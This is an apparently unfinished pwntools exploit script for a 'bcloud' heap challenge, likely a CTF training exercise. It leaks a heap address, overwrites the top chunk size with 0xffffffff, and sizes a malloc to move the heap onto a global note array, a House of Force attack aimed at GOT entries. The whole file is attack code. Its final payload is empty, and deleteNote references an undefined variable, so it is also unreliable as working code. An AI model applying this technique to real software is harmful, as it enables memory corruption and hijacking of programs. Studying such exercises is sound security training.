from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
p = process("./bcloud")
#p = remote("training.jinblack.it", 2005)
gdb.attach(p, '''
	#b *0x08048978
	b *0x08048a19 
''')
context.log_level = 'debug'

raw_input("Wait")

readGot = 0x0804b00c
freeGot = 0x0804b014
atoiGot = 0x0804b03c
arrayDimNote = 0x0804b0a0
#printfPlt = ??

def insertName():
	p.recvuntil("Input your name:")
	p.send("A"*0x3f + "B")

def insertOrg():
	p.recvuntil("Org:")
	p.send("C"*0x40)

def insertHost():
	p.recvuntil("Host:")
	p.sendline("DDDD" + "EEEE" + p32(0xffffffff))

def newNote(size, content):
	p.sendline("1")
	p.recvuntil("content:")
	p.sendline("%d" % size)
	p.recvuntil("content:")
	if size > 0:
		p.sendline(content)

def editNote(id_, content):
	p.sendline("3")
	p.recvuntil("id:")
	p.sendline("%d" % id_)
	p.recvuntil("content:")
	p.sendline(content)

def deleteNote(id_):
	p.sendline("4")
	p.recvuntil("id:")
	p.sendline("%d" %id_)
	return u32(r.recv(4))

insertName()

p.recvuntil("B")
leak = u32(p.recv(4))
print "LEAK: %#x" % leak

insertOrg()
time.sleep(0.1)
insertHost() #sovrascrivo dimensione top_chunk con 0xffffffff

#leak address name buffer 		0x0804c160
#top_chunk address after org 	0x0804c258

heapBase = leak - 0x160
topChunk = heapBase + 0x25c
print "HeapBase: %#x" % heapBase
print "topChunk: %#x" % topChunk

#toMalloc = u32(p32((arrayDimNote - topChunk - 20 + 4) & 0xffffffff, sign = "unsigned"), sign = "signed")
toMalloc = arrayDimNote - topChunk - 18

newNote(toMalloc, "")
#0804b0a0
payload = ""
payload += ""

newNote(len(payload), payload)

p.interactive()